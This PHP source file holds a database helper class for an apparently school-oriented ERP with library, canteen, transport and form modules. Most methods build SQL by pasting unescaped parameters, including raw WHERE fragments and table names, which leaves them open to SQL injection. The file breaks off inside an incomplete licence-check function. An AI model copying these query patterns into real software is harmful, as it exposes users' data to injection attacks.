<?php

   include_once 'erp_connect.php';

   class erp_function extends erp_connect
   {

    public function __construct()
    {
        parent::__construct();

    }
    
    public function erp_get_data($qry)
    {        
        $rs = $this->connection->query($qry);
        
        if ($rs == false) {
            return false;
        } 
        
        $rows = array();
        
        while ($row = $rs->fetch_assoc()) {
            $rows[] = $row;
        }
        
        return $rows;
    }

    public function ERP_EXECUTE($qry) 
    {
        $rs = $this->connection->query($qry);
        if ($rs == false) {
            echo 'Duplicate or Invalid Record. Try Again.';
            return false;
        } else {
            return true;
        }        
    }
    
    public function erp_delete($table, $id, $string) 
    { 
        $qry = "delete from $table where $string";
        $rs = $this->connection->query($qry);
        if ($rs == false) {
            echo 'Error: cannot delete $id from ' . $table;
            return false;
        } else {
            return true;
        }
    }
 
    public function escape_string($val)
    {
        return $this->connection->real_escape_string($val);
    }

    public function RETURN_FIELD($TAB, $DESC, $FIELD, $VAL) {

        $qry = "SELECT * FROM preferences_option LIMIT 1";
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) { $CID = $row['code']; }

        $RET = NULL;  
        $qry = "SELECT " . $DESC . " AS RET FROM " . $TAB . " WHERE " . $FIELD . "='" . $VAL . "' AND ccode='$CID'";

        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }
        if (strlen($RET)==0) { $RET = Null; } 
        return $RET;
    } 

    public function RETURN_FIELD_MARKSHEET($TAB, $DESC, $FIELD, $VAL, $LOG_NO) {

        $qry = "SELECT * FROM preferences_option LIMIT 1";
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) { $CID = $row['code']; }

        $RET = NULL;  
        $qry = "SELECT " . $DESC . " AS RET FROM " . $TAB . " WHERE " . $FIELD . "='" . $VAL . "' AND log_no='$LOG_NO' AND ccode='$CID'"; 

        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }
        if (strlen($RET)==0) { $RET = Null; } 
        return $RET;
    } 
    public function RETURN_FIELD_ATTENDANCE($TAB, $DESC, $FIELD, $VAL, $LOG_NO) {

        $qry = "SELECT * FROM preferences_option LIMIT 1";
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) { $CID = $row['code']; }

        $RET = NULL;  
        $qry = "SELECT " . $DESC . " AS RET FROM " . $TAB . " WHERE " . $FIELD . "='" . $VAL . "' AND log_no='$LOG_NO' AND ccode='$CID'"; 

        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }
        if (strlen($RET)==0) { $RET = Null; } 
        return $RET;
    } 

    public function PREFERENCE_FIELD($FIELD) {
        $qry = "SELECT " . $FIELD . " AS RET FROM preferences_option LIMIT 1";
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) { $RET = $row['RET']; }
        return $RET;
    } 

    public function ED_PREFERENCE_FIELD($FIELD) {
        $qry = "SELECT " . $FIELD . " AS RET FROM ed_preferences_option LIMIT 1";
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) { $RET = $row['RET']; }
        return $RET;
    } 

    public function CALENDAR_FIELD($FIELD, $ID) {
        $qry = "SELECT " . $FIELD . " AS RET FROM calendar_setup WHERE code='$ID'";
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) { $RET = $row['RET']; }
        return $RET;
    } 


    public function NEW_ID($TAB, $CID) {

        $RET = NULL;  
        $qry = "SELECT MAX(code) + 1 AS RET FROM " . $TAB . " WHERE ccode='" . $CID . "'";

        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }
        
        if (strlen($RET)==0) { $RET = 1; } 
        return $RET;

    } 

    public function NEW_MASTER_ID($TAB, $CID) {

        $RET = NULL;  
        $qry = "SELECT ifnull((lpad((max(substr(master_code, 3,2))+1),2,'0')),'01') AS RET FROM " . $TAB . " WHERE ccode='" . $CID . "'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = "0." . $row['RET'];
        }
        
        return $RET;

    } 




    public function COMPANY_ID() {
        $RET = NULL;  
        $qry = "SELECT * FROM preferences_option LIMIT 1";
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['code'];
        }
        if (strlen($RET)==0) { $RET = "001"; } 
        return $RET;
    } 

    public function NEXT_ID($TAB, $FIELD) {
        $RET = NULL;  
        $qry = "SELECT max($FIELD)+1 as ret FROM $TAB"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['ret'];
        }
        return $RET;
    } 


    public function ADATE($BDATE) {
        $RET = NULL;  
        $qry = "SELECT ad_date FROM calendar_data WHERE bs_date='$BDATE'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['ad_date'];
        }
        return $RET;
    } 

    public function BDATE($ADATE) {
        $RET = NULL;  
        $qry = "SELECT bs_date FROM calendar_data WHERE ad_date='$ADATE'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['bs_date'];
        }
        return $RET;
    } 

    public function BS_MONTH($ADATE) {
        $RET = NULL;  
        $qry = "SELECT bs_date FROM calendar_data WHERE ad_date='$ADATE'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['bs_date'];
        }
	$RET = substr($RET, 0,7);
        return $RET;
    } 

    public function BS_FIRST_DATE($BS_MONTH) {

	$BS_DATE = $BS_MONTH . "-01";
        $RET = NULL;  
        $qry = "SELECT ad_date FROM calendar_data WHERE bs_date='$BS_DATE'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['ad_date'];
        }
        return $RET;
    } 

    public function FA_FORM_ID($CID) {

        $RET = NULL;  
        $qry = "SELECT max(code) + 1 AS RET FROM fa_form_setup WHERE ccode='$CID'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }
	if (strlen($RET)==0) { $RET = "1001"; } 
        return $RET;
    } 

    public function IP_FORM_ID($CID) {

        $RET = NULL;  
        $qry = "SELECT max(code) + 1 AS RET FROM ip_form_setup WHERE ccode='$CID'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }
	if (strlen($RET)==0) { $RET = "2001"; } 
        return $RET;
    } 

    public function SB_FORM_ID($CID) {

        $RET = NULL;  
        $qry = "SELECT max(code) + 1 AS RET FROM sb_form_setup WHERE ccode='$CID'"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }

	if (strlen($RET)==0) { $RET = "3001"; } 
        return $RET;
    } 



    function TIME_INTERVAL($THIS_TIME, $LOG_TIME) {


		$WHEN = NULL;


		$seconds = strtotime($THIS_TIME) - strtotime($LOG_TIME);

		if ($seconds <=60) { $WHEN = "Just Now"; } 

	        if (($seconds >60) AND ($seconds <=3600))  { 
		   $WHEN = round($seconds/60) . " Minutes"; 
		} 
		
	        if (($seconds >3600) AND ($seconds <=86400))  { 
		   $WHEN = round($seconds/(60*60)) . " Hours"; 
		} 

	        if (($seconds >86400) AND ($seconds <=2678400))  { 
		   $WHEN = round($seconds/(60*60*24)) . " Days"; 
		} 

	        if ($seconds > 2678400)  { 
		   $WHEN = round($seconds/(60*60*24*31)) . " Months"; 
		} 

        return $WHEN;
    } 


    function WORK_HOURS($THIS_TIME, $LOG_TIME) {

		$seconds = strtotime($THIS_TIME) - strtotime($LOG_TIME);
		$hours = floor($seconds/60/60);
		$minute = $seconds/60/60 - $hours;
		$RET = $hours . ":" . str_pad(round($minute*60),2,'0', STR_PAD_LEFT);
		
		if (($seconds<28800) AND ($seconds>0)) { $RET = "<span style='color:red'>" . $RET . "</span>"; } 
	        return $RET;

    } 


   public function ERP_INFO($QID, $P1=NULL, $P2=NULL, $P3=NULL, $P4=NULL, $P5=NULL)
    {        

        $GLOBAL_SID = "erp_shared";
        $GLOBAL_RID = "erp_registration";


	if ($QID=='BOOK_COUNT') 		{ $QRY = "SELECT count(*) as RET FROM library_book_setup WHERE status_flag='Y' and library_code='$P1' and ccode='$P2'"; } 
	if ($QID=='BORROW_COUNT') 		{ $QRY = "SELECT count(*) as RET FROM book_borrowing_log WHERE log_date>='$P1' and log_date<='$P2' and ccode='$P3'"; } 
	if ($QID=='BORROW_RETURN_COUNT') 	{ $QRY = "SELECT count(*) as RET FROM book_borrowing_log WHERE return_date>='$P1' and return_date<='$P2' and ccode='$P3'"; } 
	if ($QID=='NEW_BOOK_COUNT') 		{ $QRY = "SELECT count(*) as RET FROM library_book_setup WHERE left(cdate,10)>='$P1' and left(cdate,10)<='$P2' and ccode='$P3'"; } 
	if ($QID=='NEW_MEMB_COUNT') 		{ $QRY = "SELECT count(*) as RET FROM library_registration_setup WHERE membership_date>='$P1' and membership_date<='$P2' and ccode='$P3'"; } 
	if ($QID=='MEMBERSHIP_AMOUNT') 		{ $QRY = "SELECT sum(membership_amount) as RET FROM library_registration_setup WHERE membership_date>='$P1' and membership_date<='$P2' and ccode='$P3'"; } 
	if ($QID=='FEE_AMOUNT') 		{ $QRY = "SELECT sum(amount) as RET FROM book_borrowing_log WHERE log_date>='$P1' and log_date<='$P2' and ccode='$P3'"; } 
	if ($QID=='PENALTY_AMOUNT') 		{ $QRY = "SELECT sum(penalty_amount) as RET FROM book_borrowing_log WHERE return_date>='$P1' and return_date<='$P2' and ccode='$P3'"; } 

	if ($QID=='BOOK_OUTSTAND') 		{ $QRY = "SELECT count(*) as RET FROM book_borrowing_log WHERE (return_date is null or return_date='') and ccode='$P1'"; } 
	if ($QID=='BOOK_EXPIRY') 		{ $QRY = "SELECT count(*) as RET FROM book_borrowing_log WHERE (return_date is null or return_date='') and expiry_date<='$P1' and ccode='$P2'"; } 
	if ($QID=='STUDENT_EXPIRY') 		{ $QRY = "SELECT count(*) as RET FROM library_registration_setup WHERE member_flag='S' and status_flag='Y' and expiry_date<='$P1' and ccode='$P2'"; } 
	if ($QID=='TEACHER_EXPIRY') 		{ $QRY = "SELECT count(*) as RET FROM library_registration_setup WHERE member_flag='T' and status_flag='Y' and expiry_date<='$P1' and ccode='$P2'"; } 

        $rs = $this->connection->query($QRY);

        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }

	if (strlen($RET)==0) { $RET = 0; } 
        return $RET;
        

   } 

    public function ERP_DATA($QID, $P1=NULL, $P2=NULL, $P3=NULL, $P4=NULL, $P5=NULL)
    {        

        $GLOBAL_SID = "erp_shared";
        $GLOBAL_RID = "erp_registration";


	if ($QID=='USER_LIST') 			{ $QRY = "SELECT * FROM users WHERE ccode='$P1' ORDER BY name"; }
     
	if ($QID=='PREF_DATA')  		{ $QRY = "SELECT * FROM preferences_option WHERE code='$P1'"; } 
	if ($QID=='ITEM_LIST') 			{ $QRY = "SELECT * FROM ip_item_setup WHERE group_flag='I' AND ccode='$P1' ORDER BY edesc"; } 
	if ($QID=='ITEM_INDIVIDUAL_LIST') 	{ $QRY = "SELECT * FROM ip_item_setup WHERE pre_code<>'0' AND ccode='$P1'"; } 
	if ($QID=='SUPPLIER_INDIVIDUAL_LIST') 	{ $QRY = "SELECT * FROM ip_supplier_setup WHERE pre_code<>'0' AND ccode='$P1'"; } 
	if ($QID=='CUSTOMER_INDIVIDUAL_LIST') 	{ $QRY = "SELECT * FROM sb_customer_setup WHERE pre_code<>'0' AND ccode='$P1'"; } 
	if ($QID=='ITEM_GROUP_LIST') 		{ $QRY = "SELECT * FROM ip_item_setup WHERE pre_code='0' AND ccode='$P1' ORDER BY master_code"; } 
	if ($QID=='ITEM_GROUP_INDIVIDUAL_LIST') { $QRY = "SELECT * FROM ip_item_setup WHERE master_code LIKE '" . $P1 . "%'  AND pre_code<>'0' AND ccode='$P2' ORDER BY master_code"; } 

	if ($QID=='REPORT_GROUP_LIST') 		{ $QRY = "SELECT * FROM report_setup WHERE pre_code='0' AND ccode='$P1' ORDER BY master_code"; print $QRY; } 

	if ($QID=='FA_TEMPLATE_LIST')  		{ $QRY = "SELECT * FROM " . $GLOBAL_SID . ".template_code WHERE group_flag ='F' AND code IN (SELECT object FROM fa_form_setup WHERE group_flag='F' AND ccode='$P1') ORDER BY oindex"; } 
	if ($QID=='SM_TEMPLATE_LIST')  		{ $QRY = "SELECT * FROM " . $GLOBAL_SID . ".template_code WHERE group_flag ='S' AND code IN (SELECT object FROM sb_form_setup WHERE group_flag='S' AND ccode='$P1') ORDER BY oindex"; } 
	if ($QID=='IP_TEMPLATE_LIST')  		{ $QRY = "SELECT * FROM " . $GLOBAL_SID . ".template_code WHERE group_flag IN ('I','P') AND code IN (SELECT object FROM ip_form_setup WHERE group_flag IN ('I','P') AND ccode='$P1') ORDER BY oindex"; } 
	if ($QID=='PB_TEMPLATE_LIST')  		{ $QRY = "SELECT * FROM " . $GLOBAL_SID . ".template_code WHERE group_flag IN ('PB') AND code IN (SELECT object FROM ip_form_setup WHERE group_flag IN ('PB') AND ccode='$P1') ORDER BY oindex"; } 
	if ($QID=='SB_TEMPLATE_LIST')  		{ $QRY = "SELECT * FROM " . $GLOBAL_SID . ".template_code WHERE group_flag IN ('SB') AND code IN (SELECT object FROM sb_form_setup WHERE group_flag IN ('SB') AND ccode='$P1') ORDER BY oindex"; } 


	if ($QID=='FA_FORM_LIST') 		{ $QRY = "SELECT * FROM fa_form_setup WHERE object='$P1' AND ccode='$P2' ORDER BY edesc"; } 
	if ($QID=='FA_ALL_FORM_LIST') 		{ $QRY = "SELECT * FROM fa_form_setup WHERE group_flag='F' AND ccode='$P1' ORDER BY edesc"; } 

	if ($QID=='IP_FORM_LIST') 		{ $QRY = "SELECT * FROM ip_form_setup WHERE object='$P1' AND ccode='$P2' ORDER BY edesc"; } 
	if ($QID=='IP_ALL_FORM_LIST') 		{ $QRY = "SELECT * FROM ip_form_setup WHERE object is NOT NULL AND group_flag IN ('P','I') AND ccode='$P1' ORDER BY edesc"; } 

	if ($QID=='SM_FORM_LIST') 		{ $QRY = "SELECT * FROM sb_form_setup WHERE object='$P1' AND ccode='$P2' ORDER BY edesc"; } 
	if ($QID=='SM_ALL_FORM_LIST') 		{ $QRY = "SELECT * FROM sb_form_setup WHERE group_flag='S' AND ccode='$P1' ORDER BY edesc"; } 

	if ($QID=='PB_FORM_LIST') 		{ $QRY = "SELECT * FROM ip_form_setup WHERE object='$P1' AND ccode='$P2' ORDER BY edesc"; } 
	if ($QID=='PB_ALL_FORM_LIST') 		{ $QRY = "SELECT * FROM ip_form_setup WHERE object is NOT NULL AND group_flag IN ('PB') AND ccode='$P1' ORDER BY edesc"; } 

	if ($QID=='SB_FORM_LIST') 		{ $QRY = "SELECT * FROM sb_form_setup WHERE object='$P1' AND ccode='$P2' ORDER BY edesc"; } 
	if ($QID=='SB_ALL_FORM_LIST') 		{ $QRY = "SELECT * FROM sb_form_setup WHERE object is NOT NULL AND group_flag IN ('SB') AND ccode='$P1' ORDER BY edesc"; } 

	if ($QID=='FA_SUB_LEDGER_LIST') 	{ $QRY = "SELECT * FROM fa_sub_ledger_setup WHERE group_flag ='$P1' AND ccode='$P2' ORDER BY edesc"; } 
	if ($QID=='FA_SUB_LEDGER_ALL') 		{ $QRY = "SELECT * FROM fa_sub_ledger_setup WHERE ccode='$P1' ORDER BY edesc"; } 

	if ($QID=='REFERENCE_MASTER_LIST') 	{ $QRY = "SELECT * FROM $P1 WHERE $P2='$P3' AND ccode='$P4' ORDER BY voucher_no"; } 
	if ($QID=='REFERENCE_DETAIL_LIST') 	{ $QRY = "SELECT a.*, b.edesc, b.mu_code FROM $P1 a, ip_item_setup b WHERE a.item_code = b.code and a.ccode = b.ccode and a.form_code='$P2' AND a.voucher_no='$P3' AND a.ccode='$P4' ORDER BY b.edesc"; } 
	if ($QID=='REFERENCE_NAVIGATION_LIST') 	{ $QRY = "SELECT $P2 as party_code, sum(tot_amount) as tot_amount, sum(tot_quantity) as tot_quantity FROM $P1 WHERE $P2!='$P3' AND ccode='$P4' GROUP BY $P2 ORDER BY $P2"; } 

	if ($QID=='CANTEEN_GROUP_MENU') 	{ $QRY = "SELECT * FROM canteen_setup WHERE ccode='" . $P1 . "' AND pre_code='0' ORDER BY master_code"; } 
	if ($QID=='CANTEEN_MENU') 		{ $QRY = "SELECT * FROM canteen_setup WHERE master_code LIKE '" . $P1 . "%'  AND pre_code<>'0' AND ccode='$P2' ORDER BY master_code"; } 
	if ($QID=='CANTEEN_ITEM_LIST') 		{ $QRY = "SELECT * FROM canteen_menu_setup WHERE ccode='$P1' ORDER BY edesc"; } 
	if ($QID=='CANTEEN_INFO') 		{ $QRY = "SELECT * FROM canteen_setup WHERE code='$P1' and ccode='$P2'"; } 

	if ($QID=='BORROWING_LIST') 		{ $QRY = "SELECT * FROM book_borrowing_log WHERE ccode='$P2' and (return_date is null or return_date='' or return_date='0000-00-00') ORDER BY log_no DESC LIMIT 50" ; } 
	if ($QID=='RENEWAL_LIST') 		{ $QRY = "SELECT * FROM lb_renewal_log WHERE ccode='$P2' ORDER BY log_no DESC LIMIT 50" ; } 

	if ($QID=='BORROWING_SEARCH_LIST') 	{ $P1 = strtoupper($P1); $QRY = "SELECT * FROM book_borrowing_log WHERE ccode='$P4' 
							  and (return_date is null or return_date='' or return_date='0000-00-00') 
							  and log_date>='$P2' 
						          and log_date<='$P3'
							  and (member_code IN (SELECT code FROM library_registration_setup WHERE upper(edesc) LIKE '$P1%')
							    or book_code IN (SELECT code FROM library_book_setup WHERE upper(edesc) LIKE '$P1%')
							  ) ORDER BY log_no DESC LIMIT 50" ; 
					        } 

	if ($QID=='BORROWING_RETURN_LIST') 	{ $QRY = "SELECT * FROM book_borrowing_log WHERE ccode='$P2' and (return_date is not null and return_date!='0000-00-00') ORDER BY log_no DESC LIMIT 50" ; } 
	if ($QID=='BORROWING_INFO') 		{ $QRY = "SELECT * FROM book_borrowing_log WHERE log_no='$P1' and ccode='$P2'"; } 
	if ($QID=='RENEWAL_INFO') 		{ $QRY = "SELECT * FROM lb_renewal_log WHERE log_no='$P1' and ccode='$P2'"; } 


	if ($QID=='TRANSPORTATION_GROUP_DATA') 	{ $QRY = "SELECT * FROM transportation_setup WHERE ccode='" . $P1 . "' AND pre_code='0' ORDER BY master_code"; } 
	if ($QID=='TRANSPORTATION_DATA') 	{ $QRY = "SELECT * FROM transportation_setup WHERE master_code LIKE '" . $P1 . "%'  AND pre_code<>'0' AND ccode='$P2' ORDER BY master_code"; } 

	if ($QID=='VEHICLE_DATA')	 	{ $QRY = "SELECT * FROM transportation_vehicle_setup ORDER BY edesc"; } 
	if ($QID=='STATION_DATA')	 	{ $QRY = "SELECT * FROM transportation_station_setup ORDER BY edesc"; } 

	if ($QID=='LIBRARY_GROUP_DATA') 	{ $QRY = "SELECT * FROM library_setup WHERE ccode='" . $P1 . "' AND pre_code='0' ORDER BY master_code"; } 
	if ($QID=='LIBRARY_INFO') 		{ $QRY = "SELECT * FROM library_setup WHERE code='" . $P1 . "' AND ccode='$P2'"; } 
	if ($QID=='LIBRARY_BOOK_LIST') 		{ $QRY = "SELECT * FROM library_book_setup WHERE library_code='" . $P1 . "' AND ccode='$P2' ORDER BY edesc"; } 

	if ($QID=='LIBRARY_DATA')	 	{ $QRY = "SELECT * FROM library_setup WHERE master_code LIKE '" . $P1 . "%'  AND pre_code<>'0' AND ccode='$P2' ORDER BY master_code"; } 
	if ($QID=='REGISTRATION_DATA')	 	{ $QRY = "SELECT * FROM library_registration_setup WHERE ccode='$P1' ORDER BY edesc"; } 

	if ($QID=='AUTHOR_DATA')	 	{ $QRY = "SELECT * FROM library_author_setup WHERE author_flag IN ('A','B') and ccode='$P1' ORDER BY edesc LIMIT 50"; } 
	if ($QID=='AUTHOR_INFO')	 	{ $QRY = "SELECT * FROM library_author_setup WHERE code='$P1' and ccode='$P2'"; } 
	if ($QID=='AUTHOR_SEARCH_DATA')	 	{ $P1 = strtoupper($P1); $QRY = "SELECT * FROM library_author_setup WHERE author_flag IN ('A','B') and ccode='$P2' and ((upper(edesc) LIKE '$P1%') OR (upper(contact_person) LIKE '$P1%') OR (upper(address) LIKE '$P1%')) ORDER BY edesc"; } 

	if ($QID=='PUBLISHER_DATA')	 	{ $QRY = "SELECT * FROM library_author_setup WHERE author_flag IN ('P','B') and ccode='$P1' ORDER BY edesc LIMIT 50"; } 
	if ($QID=='PUBLISHER_INFO')	 	{ $QRY = "SELECT * FROM library_author_setup WHERE code='$P1' and ccode='$P2'"; } 
	if ($QID=='PUBLISHER_SEARCH_DATA')	{ $P1 = strtoupper($P1); $QRY = "SELECT * FROM library_author_setup WHERE author_flag IN ('P','B') and ccode='$P2' and ((upper(edesc) LIKE '$P1%') OR (upper(contact_person) LIKE '$P1%') OR (upper(address) LIKE '$P1%')) ORDER BY edesc"; } 

	if ($QID=='BOOK_DATA')		 	{ $QRY = "SELECT * FROM library_book_setup WHERE ccode='$P1' ORDER BY edesc LIMIT 100"; } 
	if ($QID=='PHY_BOOK_DATA')		{ $QRY = "SELECT * FROM library_book_setup WHERE ccode='$P1' and type_code='PHY' ORDER BY edesc LIMIT 100"; } 
	if ($QID=='BOOK_INFO')		 	{ $QRY = "SELECT * FROM library_book_setup WHERE code='$P1' and ccode='$P2'"; } 
	if ($QID=='BOOK_SEARCH_DATA')		{ $QRY = "SELECT * FROM library_book_setup WHERE ccode='$P2' and $P1 ORDER BY edesc";  } 

	if ($QID=='REGISTRATION_DATA')		{ $QRY = "SELECT * FROM library_registration_setup WHERE ccode='$P1' ORDER BY edesc LIMIT 50"; } 
	if ($QID=='REGISTRATION_INFO')		{ $QRY = "SELECT * FROM library_registration_setup WHERE code='$P1' and ccode='$P2'"; } 
	if ($QID=='REGISTRATION_SEARCH_DATA')	{ $P1 = strtoupper($P1); $QRY = "SELECT * FROM library_registration_setup WHERE ccode='$P2' and ((upper(edesc) LIKE '$P1%') OR (upper(address) LIKE '$P1%')) ORDER BY edesc"; } 


	if ($QID=='NOTICE_GROUP_DATA')	 	{ $QRY = "SELECT * FROM noticeboard WHERE ccode='" . $P1 . "' AND pre_code='0' ORDER BY master_code"; } 
	if ($QID=='NOTICE_DATA')	 	{ $QRY = "SELECT * FROM noticeboard WHERE master_code LIKE '" . $P1 . "%'  AND pre_code<>'0' AND ccode='$P2' ORDER BY master_code"; } 
	if ($QID=='NOTICE_INFO')	 	{ $QRY = "SELECT * FROM noticeboard WHERE code='$P1' and ccode='" . $P2 . "'"; } 

	if ($QID=='REPORT_GROUP_DATA')	 	{ $QRY = "SELECT * FROM report_setup WHERE ccode='" . $P1 . "' AND pre_code='0' ORDER BY master_code"; } 
	if ($QID=='REPORT_DATA')	 	{ $QRY = "SELECT * FROM report_setup WHERE master_code LIKE '" . $P1 . "%'  AND pre_code<>'0' AND ccode='$P2' ORDER BY master_code"; } 
	if ($QID=='REPORT_INFO')	 	{ $QRY = "SELECT * FROM report_setup WHERE code='$P1' and ccode='" . $P2 . "'"; } 
	if ($QID=='QUERY_LIST')		 	{ $QRY = "SELECT * FROM query_manager WHERE ccode='" . $P1 . "'"; } 
	if ($QID=='QUERY_INFO')		 	{ $QRY = "SELECT * FROM query_manager WHERE code='$P1' and ccode='" . $P2 . "'"; } 
	if ($QID=='CANTEEN_PURCHASE_LIST')	{ $QRY = "SELECT a.menu_code, b.edesc, a.mu_code, sum(a.quantity) as quantity, sum(a.amount) as amount FROM canteen_purchase_log a, 							canteen_menu_setup b WHERE a.menu_code=b.code and a.ccode=b.ccode and a.log_date>='$P1' and a.log_date<='$P2' and a.ccode='$P3' 
							group by a.menu_code, b.edesc, a.mu_code";  } 

	if ($QID=='CANTEEN_SALES_LIST')	{ $QRY = "SELECT a.menu_group_code, b.edesc, sum(a.quantity) as quantity, sum(a.amount) as amount FROM canteen_order_log a, canteen_setup b WHERE 							a.menu_group_code=b.code and a.ccode=b.ccode and a.log_date>='$P1' and a.log_date<='$P2' and a.ccode='$P3' 
							group by a.menu_group_code, b.edesc";  } 

	if ($QID=='INQUIRY_INFO')	 	{ $QRY = "SELECT * FROM inquiry_log WHERE log_no='$P1' and ccode='" . $P2 . "'"; } 
	if ($QID=='INQUIRY_ACTION_LIST')	{ $QRY = "SELECT * FROM inquiry_action_log WHERE log_no='$P1' and ccode='" . $P2 . "'"; } 

	if ($QID=='IMPORT_TEACHER_LIST')  { $QRY = "SELECT * FROM ed_teacher_setup WHERE ccode='$P1' and code NOT IN (SELECT link_code FROM library_registration_setup WHERE member_flag='T' and ccode='$P1')";   } 
  	if ($QID=='IMPORT_CLASS_LIST')  {  $QRY = "SELECT * FROM ed_class_code WHERE ccode='$P1' and status_flag='Y' ORDER BY code"; } 
	if ($QID=='IMPORT_STUDENT_LIST')  { $QRY = "SELECT * FROM ed_student_setup WHERE class_code='$P1' and ccode='$P2' and code NOT IN (SELECT link_code FROM library_registration_setup WHERE member_flag='S' and ccode='$P2')";  } 





	if ($QID=='BORROW_DATA') 	{ $QRY = "SELECT * FROM book_borrowing_log WHERE log_date>='$P1' and log_date<='$P2' and ccode='$P3' order by log_no DESC"; } 
	if ($QID=='RETURN_DATA') 	{ $QRY = "SELECT * FROM book_borrowing_log WHERE return_date>='$P1' and return_date<='$P2' and ccode='$P3' order by log_no DESC"; } 
	if ($QID=='NEW_BOOK_DATA') 	{ $QRY = "SELECT * FROM library_book_setup WHERE left(cdate,10)>='$P1' and left(cdate,10)<='$P2' and ccode='$P3' order by cdate DESC"; } 
	if ($QID=='NEW_MEMB_DATA')	{ $QRY = "SELECT * FROM library_registration_setup WHERE membership_date>='$P1' and membership_date<='$P2' and ccode='$P3' order by EDESC"; } 
	if ($QID=='MEMBERSHIP_DATA') 	{ $QRY = "SELECT * FROM library_registration_setup WHERE membership_date>='$P1' and membership_date<='$P2' and ccode='$P3'"; } 
	if ($QID=='FEE_DATA') 		{ $QRY = "SELECT * FROM book_borrowing_log WHERE log_date>='$P1' and log_date<='$P2' and ccode='$P3'"; } 
	if ($QID=='BOOK_OUTSTAND_DATA') { $QRY = "SELECT * FROM book_borrowing_log WHERE (return_date is null or return_date='') and ccode='$P1'"; } 
	if ($QID=='BOOK_EXPIRY_DATA')	{ $QRY = "SELECT * FROM book_borrowing_log WHERE (return_date is null or return_date='') and expiry_date<='$P1' and ccode='$P2'"; } 
	if ($QID=='STUDENT_EXPIRY') 	{ $QRY = "SELECT * FROM library_registration_setup WHERE member_flag='S' and status_flag='Y' and expiry_date<='$P1' and ccode='$P2'"; } 
	if ($QID=='TEACHER_EXPIRY') 	{ $QRY = "SELECT * FROM library_registration_setup WHERE member_flag='T' and status_flag='Y' and expiry_date<='$P1' and ccode='$P2'"; } 

        $rs = $this->connection->query($QRY);
        
        if ($rs == false) {
            return false;
        } 
        
        $rows = array();
        
        while ($row = $rs->fetch_assoc()) {
            $rows[] = $row;
        }
        
        return $rows;
   }


    public function PURIFY_COLUMN($COLUMN) {

       $COLUMN = strtoupper($COLUMN); 

       if (($COLUMN=='CODE') OR ($COLUMN=='CCODE') OR ($COLUMN=='CBY') OR ($COLUMN=='CDATE') OR ($COLUMN=='MBY') OR ($COLUMN=='MDATE') OR ($COLUMN=='VBY') OR ($COLUMN=='VDATE')) { 
	  //do nothing 
       } else {

          $COLUMN = str_replace('_',' ',$COLUMN); 
          $COLUMN = str_replace('CODE','',$COLUMN);
          $COLUMN = str_replace('EDESC','DESCRIPTION',$COLUMN);

       }

       return $COLUMN;
    } 

   public function IN_WORD($number)
	{
	    $decimal = round($number - ($no = floor($number)), 2) * 100;
	    $hundred = null;
	    $digits_length = strlen($no);
	    $i = 0;
	    $str = array();
	    $words = array(0 => '', 1 => 'one', 2 => 'two',
        	3 => 'three', 4 => 'four', 5 => 'five', 6 => 'six',
	        7 => 'seven', 8 => 'eight', 9 => 'nine',
        	10 => 'ten', 11 => 'eleven', 12 => 'twelve',
	        13 => 'thirteen', 14 => 'fourteen', 15 => 'fifteen',
        	16 => 'sixteen', 17 => 'seventeen', 18 => 'eighteen',
	        19 => 'nineteen', 20 => 'twenty', 30 => 'thirty',
	        40 => 'forty', 50 => 'fifty', 60 => 'sixty',
        	70 => 'seventy', 80 => 'eighty', 90 => 'ninety');
	    $digits = array('', 'hundred','thousand','lakh', 'crore');
	    while( $i < $digits_length ) {
	        $divider = ($i == 2) ? 10 : 100;
        	$number = floor($no % $divider);
	        $no = floor($no / $divider);
        	$i += $divider == 10 ? 1 : 2;
	        if ($number) {
        	    $plural = (($counter = count($str)) && $number > 9) ? 's' : null;
	            $hundred = ($counter == 1 && $str[0]) ? ' and ' : null;
        	    $str [] = ($number < 21) ? $words[$number].' '. $digits[$counter]. $plural.' '.$hundred:$words[floor($number / 10) * 10].' '.$words[$number % 10]. ' '.$digits[$counter].$plural.' '.$hundred;
	        } else $str[] = null;
	    }
	    $Rupees = implode('', array_reverse($str));
	    $paise = ($decimal) ? "." . ($words[$decimal / 10] . " " . $words[$decimal % 10]) . ' Paise' : '';
	    return ($Rupees ? $Rupees . 'Rupees ' : '') . $paise . " only";

    }


   function SYSTEM_INFO() {


      $n = 0;
      $root = $_SERVER['DOCUMENT_ROOT'];
      $PHPID = php_uname('n');

      $PHPID = md5($PHPID); 	

      if ($FILEID = fopen($root . "/system.information.dll", "r")) {
      while(!feof($FILEID)) {
	   $n = $n + 1;
           $line = fgets($FILEID);
	   if ($n==84) { $SRVID = trim(substr($line, 7, 32)); } 
	   if ($n==85) { $SEXID = trim(substr($line, 7, 32)); } 
       }

       fclose($FILEID);
   }














